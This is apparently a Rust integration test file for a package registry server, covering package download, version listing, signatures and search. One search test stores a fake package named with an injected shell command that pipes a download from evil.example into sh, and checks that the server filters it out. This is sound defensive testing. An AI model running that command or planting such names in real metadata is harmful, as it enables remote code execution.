//! The real server in process (`specforge_registry_server::testing`), as the HTTP client sees it.
#![allow(
    clippy::unwrap_used,
    reason = "a test's unwrap is its assertion: a None or an Err fails the test"
)]

use specforge_package::{PackageName, Sha256, Version};
use specforge_registry_server::db::PackageVersion;
use specforge_registry_server::testing::LocalRegistry;
use specforge_registry_wire::address::Call;
use specforge_registry_wire::{PackageMetadata, VersionList};

fn tool() -> PackageName {
    PackageName::parse("@acme/tool").unwrap()
}

/// The reply of `name@version` whose binary is `wasm`.
fn reply(name: &str, version: &str, wasm: &[u8]) -> PackageMetadata {
    PackageMetadata::new(
        name.parse().unwrap(),
        version.parse().unwrap(),
        Sha256::of(wasm),
        "ignored",
    )
}

fn get(url: &str) -> reqwest::blocking::Response {
    reqwest::blocking::get(url).expect("the local registry answers")
}

#[test]
fn a_stored_package_is_served_as_published() {
    let registry = LocalRegistry::start();
    let wasm: &[u8] = b"\0asm unsigned bytes";
    // The download is checked against the stored digest, so store the real one.
    let sha256 = Sha256::of(wasm);
    registry.store(&reply("@acme/tool", "1.0.0", wasm), wasm);

    let list: VersionList = get(&registry.root().address(&Call::Package(&tool())))
        .json()
        .unwrap();
    assert_eq!(list.versions, ["1.0.0"]);

    let metadata: PackageMetadata = get(&registry
        .root()
        .address(&Call::Version(&tool(), &Version::new(1, 0, 0))))
    .json()
    .unwrap();
    assert_eq!(metadata.sha256, sha256);
    assert_eq!(
        metadata.wasm_url,
        "/v1/packages/@acme%2Ftool/1.0.0/download"
    );

    let download = get(&registry
        .root()
        .address(&Call::Download(&tool(), &Version::new(1, 0, 0))))
    .bytes()
    .unwrap();
    assert_eq!(download.as_ref(), wasm);

    assert_eq!(
        registry.requests(),
        [
            "GET /v1/packages/@acme%2Ftool",
            "GET /v1/packages/@acme%2Ftool/1.0.0",
            "GET /v1/packages/@acme%2Ftool/1.0.0/download",
        ]
    );
}

#[test]
fn versions_list_in_store_order() {
    let registry = LocalRegistry::start();
    for version in ["2.0.0", "1.0.0", "1.5.0"] {
        registry.store(&reply("@acme/tool", version, b"\0asm"), b"\0asm");
    }
    let list: VersionList = get(&registry.root().address(&Call::Package(&tool())))
        .json()
        .unwrap();
    assert_eq!(list.versions, ["2.0.0", "1.0.0", "1.5.0"]);
}

#[test]
fn a_stored_signature_reads_back_typed() {
    use specforge_registry_wire::SignedContent;
    let registry = LocalRegistry::start();
    let wasm: &[u8] = b"\0asm signed bytes";
    let signature = specforge_registry_client::SigningKey::from_bytes(&[7; 32])
        .sign(&SignedContent::of("@acme/tool", "1.0.0", wasm, "{}"));
    registry.store(
        &PackageMetadata {
            signature: Some(signature.clone()),
            manifest: "{}".into(),
            ..reply("@acme/tool", "1.0.0", wasm)
        },
        wasm,
    );
    let metadata: PackageMetadata = get(&registry
        .root()
        .address(&Call::Version(&tool(), &Version::new(1, 0, 0))))
    .json()
    .unwrap();
    assert_eq!(metadata.signature, Some(signature));
}

#[specforge_test_macros::test(
    behavior = "search_registry",
    verify = "a registry serves no stored package whose name is no package name"
)]
fn search_serves_no_stored_row_whose_name_is_no_package_name() {
    use specforge_registry_wire::SearchQuery;
    let registry = LocalRegistry::start();
    for (name, version) in [
        ("@sdk/greet; curl evil.example|sh", "9.9.9"),
        ("@sdk/good", "1.0.0"),
    ] {
        // A row from before ADR 0036: no `PackageMetadata` can hold its name.
        registry.store_row(
            &PackageVersion {
                name: name.into(),
                version: version.into(),
                sha256: "0".into(),
                size_bytes: 0,
                description: String::new(),
                keywords: String::new(),
                publisher: String::new(),
                published_at: String::new(),
                signature: None,
                manifest: String::new(),
            },
            b"\0asm",
        );
    }

    let reply: serde_json::Value = get(&registry
        .root()
        .address(&Call::Search(&SearchQuery::new("sdk"))))
    .json()
    .unwrap();

    let names: Vec<&str> = reply["results"]
        .as_array()
        .unwrap()
        .iter()
        .map(|hit| hit["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, ["@sdk/good"]);
}
